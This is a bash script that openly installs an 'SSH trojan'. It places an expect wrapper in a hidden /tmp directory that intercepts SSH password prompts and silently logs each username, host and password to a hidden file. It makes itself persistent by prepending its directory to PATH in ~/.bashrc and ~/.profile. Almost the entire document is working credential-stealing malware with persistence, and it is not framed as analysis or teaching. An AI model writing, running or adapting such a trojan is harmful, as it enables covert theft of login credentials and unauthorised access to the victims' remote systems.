#!/bin/bash

# Create directory for our SSH trojan
mkdir -p /tmp/.sshtrojan2

# Create the SSH wrapper script using expect
cat > /tmp/.sshtrojan2/ssh << 'EOF'
#!/usr/bin/expect -f

# Get the arguments
set args [lrange $argv 0 end]

# Extract username and hostname from command line arguments
set username ""
set hostname ""

# Try to find username@hostname pattern
foreach arg $args {
    if {[regexp {(.+)@(.+)} $arg match user host] && ![string match "-*" $arg]} {
        set username $user
        set hostname $host
        break
    }
}

# If not found in user@host format, look for -l option and hostname separately
if {$username == "" || $hostname == ""} {
    for {set i 0} {$i < [llength $args]} {incr i} {
        set arg [lindex $args $i]
        if {$arg == "-l" && $i + 1 < [llength $args]} {
            set username [lindex $args [expr $i + 1]]
        } elseif {![string match "-*" $arg] && $hostname == "" && ![string match $username $arg]} {
            set hostname $arg
        }
    }
}

# Spawn the real SSH command with all original arguments
spawn /usr/bin/ssh {*}$args

# Handle password prompt
expect {
    -re "(assword:|word:)" {
        # Get password from user
        stty -echo
        send_user "Password: "
        expect_user -re "(.*)\n"
        set password $expect_out(1,string)
        stty echo
        send_user "\n"

        # Log the password to file
        set log_file [open "/tmp/.log_sshtrojan2.txt" "a"]
        puts $log_file "[clock format [clock seconds]]: Username: $username, Host: $hostname, Password: $password"
        close $log_file

        # Send password to SSH
        send "$password\r"
        exp_continue
    }
    eof
}

# Wait for SSH to finish and exit with the same status
catch wait result
exit [lindex $result 3]
EOF

# Make the wrapper executable
chmod +x /tmp/.sshtrojan2/ssh

# Add the trojan directory to the beginning of the PATH
echo 'export PATH="/tmp/.sshtrojan2:$PATH"' >> ~/.bashrc
echo 'export PATH="/tmp/.sshtrojan2:$PATH"' >> ~/.profile

# Source the updated PATH to apply immediately in current session
export PATH="/tmp/.sshtrojan2:$PATH"

echo "SSH trojan installed. It will be active for new shell sessions and current session."
